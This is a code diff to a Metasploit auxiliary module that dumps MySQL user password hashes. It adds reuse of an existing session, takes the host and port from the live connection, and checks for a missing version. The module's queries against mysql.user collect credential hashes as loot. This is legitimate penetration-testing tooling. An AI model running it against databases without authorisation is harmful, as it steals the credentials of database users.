@@ -6,8 +6,8 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MYSQL
   include Msf::Auxiliary::Report
-
   include Msf::Auxiliary::Scanner
+  include Msf::OptionalSession::MySQL
 
   def initialize
     super(
@@ -22,12 +22,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
-    return unless mysql_login_datastore
+    # If we have a session make use of it
+    if session
+      print_status("Using existing session #{session.sid}")
+      self.mysql_conn = session.client
+    else
+      # otherwise fallback to attempting to login
+      return unless mysql_login_datastore
+    end
 
     service_data = {
-      address: ip,
-      port: rport,
+      address: mysql_conn.peerhost,
+      port: mysql_conn.peerport,
       service_name: 'mysql',
       protocol: 'tcp',
       workspace_id: myworkspace_id
@@ -57,6 +63,11 @@ class MetasploitModule < Msf::Auxiliary
     # Grab the username and password hashes and store them as loot
     version = mysql_get_variable("@@version")
 
+    if version.nil?
+      print_error("There was an error reading the version")
+      return
+    end
+
     # Starting from MySQL 5.7, the 'password' column was changed to 'authentication_string'.
     if version[0..2].to_f > 5.6
       res = mysql_query("SELECT user,authentication_string from mysql.user")
@@ -70,8 +81,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     service_data = {
-      address: ::Rex::Socket.getaddress(rhost, true),
-      port: rport,
+      address: ::Rex::Socket.getaddress(mysql_conn.peerhost, true),
+      port: mysql_conn.peerport,
       service_name: 'mysql',
       protocol: 'tcp',
       workspace_id: myworkspace_id
